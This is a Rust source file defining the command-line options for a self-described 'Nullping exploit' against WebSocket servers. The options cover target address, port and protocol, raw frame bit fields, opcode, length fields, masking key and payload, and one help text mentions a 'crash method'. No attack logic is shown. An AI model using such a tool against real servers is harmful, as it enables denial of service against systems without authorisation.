use clap::Parser;

#[derive(Parser, Debug)]
#[command(
    version = "1.0.0",
    author = "Pulsar",
    about = "The first and actual Nullping exploit implementation for WebSocket servers, that actually works for misconfigured servers"
)]
pub(crate) struct Args {
    #[arg(long,
        default_value_t = String::from("localhost"),
        help = "Target URL"
    )]
    pub address: String,
    #[arg(long, default_value_t = 10000, help = "Target port")]
    pub port: u16,
    #[arg(long,
        default_value_t = String::from("ws"),
        help = "Target protocol (wss|ws)"
    )]
    pub protocol: String,
    #[arg(long,
        default_value_t = String::from("dGhlIHNhbXBsZSBub25jZQ=="),
        help = "Sec-WebSocket-Key header value. A Base64 encoded random string."
    )]
    pub sec_websocket_key: String,
    #[arg(long,
        default_value_t = String::from("/"),
        help = "WebSocket server listen path"
    )]
    pub path: String,
    #[arg(long, default_value_t = false, help = "FIN bit field")]
    pub fin: bool,
    #[arg(long, default_value_t = false, help = "RSV1 bit field")]
    pub rsv1: bool,
    #[arg(long, default_value_t = false, help = "RSV2 bit field")]
    pub rsv2: bool,
    #[arg(long, default_value_t = false, help = "RSV3 bit field")]
    pub rsv3: bool,
    #[arg(long, default_value_t = false, help = "Mask bit field")]
    pub mask: bool,
    #[arg(long, default_value_t = 0, help = "Opcode field")]
    pub opcode: u8,
    #[arg(long, default_value_t = 0usize, help = "Payload length field")]
    pub len: usize,
    #[arg(
        long,
        default_value_t = 0,
        help = "Extended length depacked. Fill this field if the payload length exceeds 125 bytes, or a crash method requires it"
    )]
    pub extended_length: u64,
    #[arg(long,
        default_values_t = vec![0u8],
        help = "Masking key",
        num_args = 0..,
        value_delimiter = ','
    )]
    pub key: Vec<u8>,
    #[arg(long,
        default_values_t = vec![0u8],
        help = "Payload",
        num_args = 0..,
        value_delimiter = ','
    )]
    pub payload: Vec<u8>,
}
